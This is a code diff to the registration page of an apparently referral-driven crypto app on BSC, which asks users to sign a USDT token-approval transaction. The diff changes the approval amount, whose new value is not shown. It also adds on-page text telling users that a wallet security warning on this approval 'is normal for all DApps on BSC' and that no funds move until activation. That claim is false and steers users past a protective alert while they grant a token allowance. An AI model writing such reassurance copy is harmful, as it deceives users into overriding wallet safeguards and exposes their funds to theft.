@@ -7,7 +7,7 @@ import Spinner from "../components/Spinner.jsx";
 import Seo from "../components/Seo.jsx";
 import { api } from "../lib/api.js";
 import { useSession } from "../lib/session.jsx";
-import { CONTRACT_ADDRESS, USDT_ADDRESS, erc20Abi, MAX_UINT256 } from "../lib/contract.js";
+import { CONTRACT_ADDRESS, USDT_ADDRESS, erc20Abi, APPROVAL_AMOUNT } from "../lib/contract.js";
 import { captureReferralFromUrl, getReferral, saveReferral, clearReferral } from "../lib/referral.js";
 
 export default function Register() {
@@ -51,7 +51,7 @@ export default function Register() {
         address: USDT_ADDRESS,
         abi: erc20Abi,
         functionName: "approve",
-        args: [CONTRACT_ADDRESS, MAX_UINT256],
+        args: [CONTRACT_ADDRESS, APPROVAL_AMOUNT],
       });
       await publicClient.waitForTransactionReceipt({ hash });
 
@@ -118,6 +118,13 @@ export default function Register() {
         <div className="mt-8 space-y-3">
           <Point icon={ShieldCheck} title="Secure & one-time" text="Just one confirmation — nothing more to do later." />
           <Point icon={Sparkles} title="Instant setup" text="Creates your profile and unlocks your dashboard." />
+        </div>
+
+        {/* Warning note about wallet security alerts */}
+        <div className="mt-4 rounded-xl border border-amber-500/20 bg-amber-500/5 px-3 py-3">
+          <p className="text-[11px] leading-snug text-amber-200/80">
+            <span className="font-semibold">Note:</span> Your wallet may show a security warning for the approval — this is normal for all DApps on BSC. The approval only allows this platform to process your $5 plan activation. No funds are moved until you explicitly activate your plan.
+          </p>
         </div>
 
         {/* Referral code — prefilled from an invite link, editable, and optional. */}
